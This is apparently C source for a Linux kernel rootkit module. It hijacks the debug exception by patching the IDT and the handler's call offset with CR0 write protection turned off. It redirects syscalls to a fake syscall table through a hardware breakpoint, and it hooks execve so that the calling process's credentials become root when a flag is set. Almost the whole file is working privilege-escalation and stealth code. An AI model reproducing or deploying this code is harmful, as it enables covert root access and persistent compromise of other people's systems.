#include "syscall_table.h"
#include "hook.h"
#include "dr_breakpoints.h"
#include "utils.h"

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

#define SYSCALL(sys) (t_syscall)sct[__NR_##sys]
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[320];
static unsigned long *sct;

/* set root escalation flag */
int is_root = 0;

unsigned int do_debug_v = DO_DEBUG_VECTOR;
gate_desc old_gate_entry, new_gate_desc;

static unsigned int new_call_off = 0x0;
static unsigned int old_call_off = 0x0;
static unsigned int *patched_addr = NULL;

/*
 * rax -> fake_sct index
 */
void my_do_debug(struct pt_regs *regs)
{
  unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
  regs->ax += off / sizeof(unsigned long);
}

int patch_idt(void)
{
  struct desc_ptr idtr;
  gate_desc *gate_ptr;
  unsigned char *ptr;
  unsigned long cr0, addr;
  int i, call_found = 0;
  
  store_idt(&idtr);

  gate_ptr = (gate_desc *) (idtr.address + do_debug_v * sizeof(gate_desc));
  addr = (unsigned long) HML_TO_ADDR(gate_ptr->offset_high, gate_ptr->offset_middle, gate_ptr->offset_low);

  memcpy(&old_gate_entry, (void *)(idtr.address + do_debug_v * sizeof(gate_desc)), sizeof(gate_desc));
  pack_gate(&new_gate_desc, GATE_TRAP, (unsigned long)addr, 0x3, 0, 0);
  
  ptr = (unsigned char *)addr;
  for (i = 0; i < 512; i++) {
	if (is_call(ptr)) {
	  if (call_found == 1) {
		unsigned int call_off = ((unsigned int) ptr[1]) | (((unsigned int) ptr[2]) << 8)
		  | (((unsigned int) ptr[3]) << 16) | (((unsigned int) ptr[4]) << 24);
		old_call_off = call_off;

		new_call_off = (unsigned int) ((unsigned long) my_do_debug - (unsigned long) &ptr[5]);
		patched_addr = (unsigned int *) &ptr[1];

		clear_CR0_WP();
		arch_cmpxchg(patched_addr, old_call_off, new_call_off);
		write_idt_entry((gate_desc *)idtr.address, do_debug_v, &new_gate_desc);
		set_CR0_WP();
		debug_print("IDT patching done");
		return 0;
	  }
	  else
		call_found++;
	}
	ptr++;
  }
  return -1;
}

void unpatch_idt(void)
{
  struct desc_ptr idtr;

  store_idt(&idtr);
  clear_CR0_WP();
  arch_cmpxchg(patched_addr, new_call_off, old_call_off);
  write_idt_entry((gate_desc *)idtr.address, do_debug_v, &old_gate_entry);
  set_CR0_WP();
}

static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
{
  if (is_root == 1) {

	/* generating root permissions */
	struct cred *np;
	np = prepare_creds();

	np->uid.val = np->gid.val = 0;
	np->euid.val = np->egid.val = 0;
	np->suid.val = np->sgid.val = 0;
	np->fsuid.val = np->fsgid.val = 0;

	/* commit creds to task_struct of current process */
	commit_creds(np);
  }
  return (int)SYSCALL(execve);
}

int hook_syscall_table(void)
{
  unsigned long gd_addr;

  table_ptr = sys_call_table_retrieve();
  sct = (unsigned long *)table_ptr;
  if (!sct)
	return -1;

  memcpy(fake_sct, sct, sizeof(fake_sct));

  HOOK(execve, new_sys_execve);

  unsigned long call_sys_addr = get_syscall_64_addr();
  if (!call_sys_addr)
	return -ENXIO; // set errno to "no such device or address"
  gd_addr = get_gadget_addr((void *)call_sys_addr);
  if (!gd_addr)
	return -ENXIO; // set errno to "no such device or address"

  debug_print("Registering hardware breakpoint at %p", (void *)gd_addr);
  
  reg_dr_bp(gd_addr, DR_RW_X, 0);

  return 0;
}
